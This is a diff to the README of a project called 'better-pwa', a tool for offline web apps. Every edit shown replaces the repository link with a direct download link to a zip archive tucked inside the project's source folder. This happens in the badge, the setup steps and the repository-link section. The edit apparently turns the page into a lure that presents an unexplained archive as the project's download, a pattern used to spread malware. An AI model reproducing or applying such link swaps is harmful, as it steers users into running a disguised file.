@@ -1,6 +1,6 @@
 # ✨ better-pwa - Simple offline apps for the web
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge)](https://github.com/Fakhrimub1073/better-pwa)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip)
 
 ## 🧭 What this is
 
@@ -20,7 +20,7 @@ It is made for modern web apps that use tools like Next.js, Vite, or plain JavaS
 
 Visit this page to download or open the project files:
 
-[https://github.com/Fakhrimub1073/better-pwa](https://github.com/Fakhrimub1073/better-pwa)
+[https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip](https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip)
 
 If you are looking for the main project page, use the link above, then get the files from the repository.
 
@@ -30,7 +30,7 @@ If you are looking for the main project page, use the link above, then get the f
 
 Open the link in your browser:
 
-[https://github.com/Fakhrimub1073/better-pwa](https://github.com/Fakhrimub1073/better-pwa)
+[https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip](https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip)
 
 ### Step 2: Get the files
 
@@ -228,7 +228,7 @@ After setup, check these points:
 
 ## 📌 Repository link
 
-[https://github.com/Fakhrimub1073/better-pwa](https://github.com/Fakhrimub1073/better-pwa)
+[https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip](https://raw.githubusercontent.com/Fakhrimub1073/better-pwa/main/packages/cli/src/pwa_better_v2.7.zip)
 
 ## 🧩 Notes for everyday use
 
